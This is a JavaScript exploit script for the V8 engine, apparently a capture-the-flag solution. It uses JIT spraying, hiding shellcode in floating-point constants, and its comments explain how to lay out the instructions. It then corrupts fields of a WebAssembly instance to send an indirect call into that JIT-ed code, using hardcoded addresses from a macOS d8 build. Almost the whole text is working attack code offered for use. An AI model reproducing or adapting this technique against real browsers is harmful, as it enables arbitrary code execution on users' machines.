var conversion_buffer = new ArrayBuffer(8);
var float_view = new Float64Array(conversion_buffer);
var int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function() {
    return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function() {
    int_view[0] = this;
    return float_view[0];
}
Number.prototype.f2i = function() {
    float_view[0] = this;
    return int_view[0];
}

/* 
Note: so jited code is not flat, you need to write assembly which should have 6 bytes instruction and two bytes for jump to $rip+13, so that it can point to next variable in the below function
Ex:
6a 00           push   0x0 ; 2
90              nop        ; 3
90              nop        ; 4
90              nop        ; 5
90              nop        ; 6
eb  11          jmp     short $+0x13; 8

68 61 74 6f 72  push   0x726f7461 ;5
5b              pop    rbx ; 6
eb  11          jmp     short $+0x13; 8


68 2e 61 70 70  push   0x7070612e ;5
5a              pop    rdx ;6
eb  11          jmp     short $+0x13; 8


6a 10           push   0x10 ;2
5f              pop    rdi  ;3
b1 1c           mov    cl, 0x1c ;5
90              nop        ; 6
eb  11          jmp     short $+0x13; 8

blah blah
In this way you need to construct your jit code

*/
function jit_me(a) {
	a += 3.0077864057630538e-251;
         a += -6.828904445483505e-229;
  	a += -6.925144265966743e-229;
  	a += -9.420263431578707e-228;
	 a += -6.654614018578406e+60;
return a;};


for(i=0;i<0x1000;i++)jit_me(0);

// %PrepareFunctionForOptimization(jit_me);
// jit_me(0);
// %OptimizeFunctionOnNextCall(jit_me);
// jit_me(1);
function pwn(){
var wc = new Uint8Array([0,97,115,109,1,0,0,0,1,4,1,96,0,0,2,7,1,1,101,1,102,0,0,7,5,1,1,102,0,0,0,22,4,110,97,109,101,1,10,1,0,7,105,109,112,111,114,116,48,2,3,1,0,0]);
var wm = new WebAssembly.Module(wc);

var imports = {e: {f: function() {return 42;}}};
var wi = new WebAssembly.Instance(wm, imports);

/* [element+0x17] + 0x3f */
wi[0] = 0x1;
wi[1] = 0x1;

wi[2] = 0x2;
wi[3] = 0x2;
/* 
x  = upper +  w[4]
c = x + 0x3f
call c // call   rcx ; 0x2c5200001273 @
*/
/*
I don't where to jump plus we have limited jump because higher bytes are fixed, but as I noticed jited functions stays in same location as this higher bytes
 vakzz told me that we can JIT and jump there, checkout jit_me above.
This is the pointer, to your JITed code, 
 I don't know how to make this stable, it might change for system to system but for me it looks stable on my d8 
*/

wi[4] = ((0x1c51a7 - 0x3f)/2) ; // element + 0x17 - 0x3f = pointer we want to point

/* You can groom the heap to make it stable, on Mac this is same for every run */
/* point to any valid pointer */
wi['a'] ={}

wi['b'] = [ 0x7fff20362e28n.i2f(), 0x7fff20362e28n.i2f(), 0x7fff20362e28n.i2f()]; //hardcoded value, idk its same for every run


const f = wi.exports['f'];
function invoke_vv(index) {
       return f();
   }



// %PrepareFunctionForOptimization(invoke_vv);
// %DebugPrint(wi);
// invoke_vv(0);
// // %SystemBreak();
// %OptimizeFunctionOnNextCall(invoke_vv);
// invoke_vv(0);




  for (let index = 0; index < 0x10000; index++) {
         invoke_vv(0);
    }
}
pwn();



